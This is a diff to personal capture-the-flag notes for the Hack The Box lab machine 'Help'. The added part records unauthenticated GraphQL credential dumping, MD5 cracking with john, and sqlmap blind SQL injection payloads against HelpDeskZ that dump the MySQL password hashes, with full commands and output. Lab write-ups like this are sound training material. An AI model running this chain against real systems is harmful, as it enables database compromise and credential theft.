@@ -97,6 +97,161 @@ location: http://help.htb/support/?v=submit_ticket&action=confirmationMsg&param[
 
 neither the 3-3-5 nor the 11 character strings appear to be the ticket IDs.
 
+### coming back
+
+think the exploit path we're on will work, but `rs.php` uploads lead to `File is not allowed`
+
+  * tried the file as `rs.png` and it uploaded successfully, but wasn't found
+  * tried the file as `rs.php` but with `Content-Type: image/png`, still file not allowed
+
+
+going back to 3000 - `find the credentials with given query`.. thats graphql, right?
+
+```
+GET /graphql HTTP/1.1
+
+...
+
+HTTP/1.1 400 Bad Request
+X-Powered-By: Express
+Date: Thu, 11 Aug 2022 22:23:32 GMT
+Connection: close
+Content-Length: 18
+
+GET query missing.
+```
+
+trying to get `http://help.htb:3000/graphql?help.htb:3000/graphql?query={__schema{types{name,fields{name}}}}` yields `Must provide query string`, so should write some code..
+
+but actually, the param was bad - `http://help.htb:3000/graphql?query={__schema{types{name,fields{name}}}}` yields.. what we're looking for
+
+curl does not like the nesting, so wget
+
+```
+{
+  "data": {
+    "__schema": {
+      "types": [
+        {
+          "name": "Query",
+          "fields": [
+            {
+              "name": "user"
+            }
+          ]
+        },
+        {
+          "name": "User",
+          "fields": [
+            {
+              "name": "username"
+            },
+            {
+              "name": "password"
+            }
+          ]
+        },
+
+```
+
+nice. now we just need to query for the values
+
+username is likely `shiv`, so just need the password
+
+```
+$ wget "http://help.htb:3000/graphql?query={user {username,password} }"
+--2022-08-11 16:31:38--  http://help.htb:3000/graphql?query=%7Buser%20%7Busername,password%7D%20%7D
+Resolving help.htb (help.htb)... 10.10.10.121
+Connecting to help.htb (help.htb)|10.10.10.121|:3000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 96 [application/json]
+Saving to: ‘graphql?query={user {username,password} }’
+
+graphql?query={user {username,password} }       100%[=====================================================================================================>]      96  --.-KB/s    in 0s
+
+2022-08-11 16:31:38 (12.7 MB/s) - ‘graphql?query={user {username,password} }’ saved [96/96]
+
+$ cat graphql\?query\=\{user\ \{username\,password\}\ \}  | jq .
+{
+  "data": {
+    "user": {
+      "username": "helpme@helpme.com",
+      "password": "5d3c93182bb20f07b994a7f617e99cff"
+    }
+  }
+}
+```
+
+nice. that looks like an md5 hash
+
+```
+$ john_rockyou users.hash --format='dynamic=md5($p)'
+Using default input encoding: UTF-8
+Loaded 1 password hash (dynamic=md5($p) [256/256 AVX2 8x3])
+Warning: no OpenMP support for this hash type, consider --fork=16
+Press 'q' or Ctrl-C to abort, almost any other key for status
+godhelpmeplz     (?)
+1g 0:00:00:00 DONE (2022-08-11 16:33) 2.631g/s 20628Kp/s 20628Kc/s 20628KC/s godsgift2689..god777!!!
+Use the "--show --format=dynamic=md5($p)" options to display all of the cracked passwords reliably
+Session completed.
+
+real    0m0.541s
+user    0m0.360s
+sys     0m0.142s
+```
+
+nice - but.. that does not work for `helpme` or `shiv` on ssh -- but it does get us in to the helpdeskz 
+
+and.. we can now use sqlmap to trigger the authenticated exploit that was not working unauthenticated..
+
+```
+$ sqlmap -r view_tickets2.txt --level 5
+[16:54:38] [INFO] checking if the injection point on GET parameter 'param[]' is a false positive
+GET parameter 'param[]' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
+sqlmap identified the following injection point(s) with a total of 510 HTTP(s) requests:
+---
+Parameter: param[] (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: v=view_tickets&action=ticket&param[]=7&param[]=attachment&param[]=3&param[]=9 AND 8529=8529
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: v=view_tickets&action=ticket&param[]=7&param[]=attachment&param[]=3&param[]=9 AND (SELECT 6831 FROM (SELECT(SLEEP(5)))cTlH)
+---
+[16:54:44] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 16.04 or 16.10 (xenial or yakkety)
+web application technology: Apache 2.4.18
+back-end DBMS: MySQL >= 5.0.12
+[16:54:44] [INFO] fetched data logged to text files under '/home/conor/.local/share/sqlmap/output/help.htb'
+```
+
+nice...
+
+```
+$ sqlmap -r view_tickets2.txt --level 5 --risk 3 -p param[] --passwords
+...
+database management system users password hashes:
+[*] debian-sys-maint [1]:
+    password hash: *5235DAA85DEEFA147A945B565DA3DE370CE8E5C9
+[*] mysql.session [1]:
+    password hash: *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
+[*] mysql.sys [1]:
+    password hash: *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
+[*] root [1]:
+    password hash: *AEC9BA84F3CBB00DE426B0E939C665E2D7391CC1
+
+```
+
+root hash falls 
+```
+helpme           (?)     
+```
+
+but what user does that belong to?
+
+
+
 
 ## flag
 ```
